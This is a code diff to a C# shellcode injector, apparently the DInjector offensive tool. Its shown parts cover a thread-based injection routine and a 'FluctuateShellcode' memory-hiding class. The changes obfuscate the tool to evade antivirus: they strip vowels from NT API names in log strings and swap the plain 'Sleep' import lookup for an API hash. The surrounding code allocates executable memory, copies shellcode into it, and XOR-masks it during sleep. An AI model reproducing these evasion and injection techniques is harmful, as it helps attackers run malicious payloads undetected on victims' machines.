@@ -54,9 +54,9 @@ namespace DInjector
                 allocProtect);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine($"(CurrentThread) [+] NtAllocateVirtualMemory, {strAllocProtect}");
+                Console.WriteLine($"(CurrentThread) [+] NtAllctVrtlMmry, {strAllocProtect}");
             else
-                throw new Exception($"(CurrentThread) [-] NtAllocateVirtualMemory, {strAllocProtect}: {ntstatus}");
+                throw new Exception($"(CurrentThread) [-] NtAllctVrtlMmry, {strAllocProtect}: {ntstatus}");
 
             Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);
 
@@ -79,9 +79,9 @@ namespace DInjector
                     ref oldProtect);
 
                 if (ntstatus == NTSTATUS.Success)
-                    Console.WriteLine($"(CurrentThread) [+] NtProtectVirtualMemory, {strNewProtect}");
+                    Console.WriteLine($"(CurrentThread) [+] NtPrtctVrtlMmry, {strNewProtect}");
                 else
-                    throw new Exception($"(CurrentThread) [-] NtProtectVirtualMemory, {strNewProtect}: {ntstatus}");
+                    throw new Exception($"(CurrentThread) [-] NtPrtctVrtlMmry, {strNewProtect}: {ntstatus}");
 
                 #endregion
             }
@@ -128,9 +128,9 @@ namespace DInjector
                 IntPtr.Zero);*/
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(CurrentThread) [+] NtCreateThreadEx");
+                Console.WriteLine("(CurrentThread) [+] NtCrtThrdEx");
             else
-                throw new Exception($"(CurrentThread) [-] NtCreateThreadEx: {ntstatus}");
+                throw new Exception($"(CurrentThread) [-] NtCrtThrdEx: {ntstatus}");
 
             #endregion
 
@@ -147,9 +147,9 @@ namespace DInjector
                     ref liFlipSleep);
 
                 if (ntstatus == NTSTATUS.Success)
-                    Console.WriteLine("(CurrentThread) [+] NtDelayExecution, flipSleep");
+                    Console.WriteLine("(CurrentThread) [+] NtDlyExctn, flipSleep");
                 else
-                    throw new Exception($"(CurrentThread) [-] NtDelayExecution, flipSleep: {ntstatus}");
+                    throw new Exception($"(CurrentThread) [-] NtDlyExctn, flipSleep: {ntstatus}");
 
                 #endregion
 
@@ -167,9 +167,9 @@ namespace DInjector
                     ref oldProtect);
 
                 if (ntstatus == NTSTATUS.Success)
-                    Console.WriteLine("(CurrentThread) [+] NtProtectVirtualMemory, protect");
+                    Console.WriteLine("(CurrentThread) [+] NtPrtctVrtlMmry, protect");
                 else
-                    throw new Exception($"(CurrentThread) [-] NtProtectVirtualMemory, protect: {ntstatus}");
+                    throw new Exception($"(CurrentThread) [-] NtPrtctVrtlMmry, protect: {ntstatus}");
 
                 #endregion
 
@@ -182,9 +182,9 @@ namespace DInjector
                     ref suspendCount);
 
                 if (ntstatus == NTSTATUS.Success)
-                    Console.WriteLine("(CurrentThread) [+] NtResumeThread");
+                    Console.WriteLine("(CurrentThread) [+] NtRsmThrd");
                 else
-                    throw new Exception($"(CurrentThread) [-] NtResumeThread: {ntstatus}");
+                    throw new Exception($"(CurrentThread) [-] NtRsmThrd: {ntstatus}");
 
                 #endregion
             }
@@ -204,11 +204,11 @@ namespace DInjector
                     ref liTimeout);
 
                 if (ntstatus == NTSTATUS.Success)
-                    Console.WriteLine("(CurrentThread) [+] NtWaitForSingleObject|STATUS_SUCCESS, timeout");
+                    Console.WriteLine("(CurrentThread) [+] NtWtFrSnglObjct|STATUS_SUCCESS, timeout");
                 else if (ntstatus == NTSTATUS.Timeout)
-                    Console.WriteLine("(CurrentThread) [+] NtWaitForSingleObject|STATUS_TIMEOUT, timeout");
+                    Console.WriteLine("(CurrentThread) [+] NtWtFrSnglObjct|STATUS_TIMEOUT, timeout");
                 else
-                    throw new Exception($"(CurrentThread) [-] NtWaitForSingleObject, timeout: {ntstatus}");
+                    throw new Exception($"(CurrentThread) [-] NtWtFrSnglObjct, timeout: {ntstatus}");
 
                 #endregion
 
@@ -228,9 +228,9 @@ namespace DInjector
                         ref tmpProtect);
 
                     if (ntstatus == NTSTATUS.Success)
-                        Console.WriteLine("(CurrentThread.CleanUp) [+] NtProtectVirtualMemory, PAGE_READWRITE");
+                        Console.WriteLine("(CurrentThread.CleanUp) [+] NtPrtctVrtlMmry, PAGE_READWRITE");
                     else
-                        throw new Exception($"(CurrentThread.CleanUp) [-] NtProtectVirtualMemory, PAGE_READWRITE: {ntstatus}");
+                        throw new Exception($"(CurrentThread.CleanUp) [-] NtPrtctVrtlMmry, PAGE_READWRITE: {ntstatus}");
 
                     #endregion
                 }
@@ -249,9 +249,9 @@ namespace DInjector
                     DI.Data.Win32.Kernel32.MEM_RELEASE);
 
                 if (ntstatus == NTSTATUS.Success)
-                    Console.WriteLine("(CurrentThread.CleanUp) [+] NtFreeVirtualMemory, shellcode");
+                    Console.WriteLine("(CurrentThread.CleanUp) [+] NtFrVrtlMmry, shellcode");
                 else
-                    throw new Exception($"(CurrentThread.CleanUp) [-] NtFreeVirtualMemory, shellcode: {ntstatus}");
+                    throw new Exception($"(CurrentThread.CleanUp) [-] NtFrVrtlMmry, shellcode: {ntstatus}");
 
                 #endregion
             }
@@ -266,11 +266,11 @@ namespace DInjector
                 ref liInf);
 
             if (ntstatus == NTSTATUS.Success)
-                Console.WriteLine("(CurrentThread) [+] NtWaitForSingleObject|STATUS_SUCCESS, inf");
+                Console.WriteLine("(CurrentThread) [+] NtWtFrSnglObjct|STATUS_SUCCESS, inf");
             else if (ntstatus == NTSTATUS.Timeout)
-                Console.WriteLine("(CurrentThread) [+] NtWaitForSingleObject|STATUS_TIMEOUT, inf");
+                Console.WriteLine("(CurrentThread) [+] NtWtFrSnglObjct|STATUS_TIMEOUT, inf");
             else
-                throw new Exception($"(CurrentThread) [-] NtWaitForSingleObject, inf: {ntstatus}");
+                throw new Exception($"(CurrentThread) [-] NtWtFrSnglObjct, inf: {ntstatus}");
 
             #endregion
 
@@ -319,7 +319,8 @@ namespace DInjector
 
         public FluctuateShellcode(uint fluctuate, bool spoofStack, IntPtr shellcodeAddr, int shellcodeLen, bool debug)
         {
-            sleepOriginAddress = DI.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "Sleep");
+            // { API_HASHING:Sleep }
+            sleepOriginAddress = DI.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "28e113f99b252b655e08307d55d4839d", 0x14bf6f02);
             sleepOrig = (Sleep)Marshal.GetDelegateForFunctionPointer(sleepOriginAddress, typeof(Sleep));
             Marshal.Copy(sleepOriginAddress, sleepOriginBytes, 0, 16);
 
@@ -528,7 +529,7 @@ namespace DInjector
                     Console.WriteLine("(FluctuateShellcode) [DEBUG] Re-protecting at address " + string.Format("{0:X}", shellcodeAddress.ToInt64()) + " to 0x" + newProtect.ToString("X2"));
             }
             else
-                throw new Exception($"(FluctuateShellcode) [-] NtProtectVirtualMemory, newProtect: {ntstatus}");
+                throw new Exception($"(FluctuateShellcode) [-] NtPrtctVrtlMmry, newProtect: {ntstatus}");
         }
 
         void XorMemory()
@@ -618,7 +619,7 @@ namespace DInjector
             if (ntstatus == NTSTATUS.Success) //{ }
                 Console.WriteLine("(FluctuateShellcodeMiniHook) [DEBUG] Re-protecting at address " + string.Format("{0:X}", shellcodeAddress.ToInt64()) + " to 0x" + newProtect.ToString("X2"));
             else
-                throw new Exception($"(FluctuateShellcodeMiniHook) [-] NtProtectVirtualMemory, protect: {ntstatus}");
+                throw new Exception($"(FluctuateShellcodeMiniHook) [-] NtPrtctVrtlMmry, protect: {ntstatus}");
         }
 
         void XorMemory()
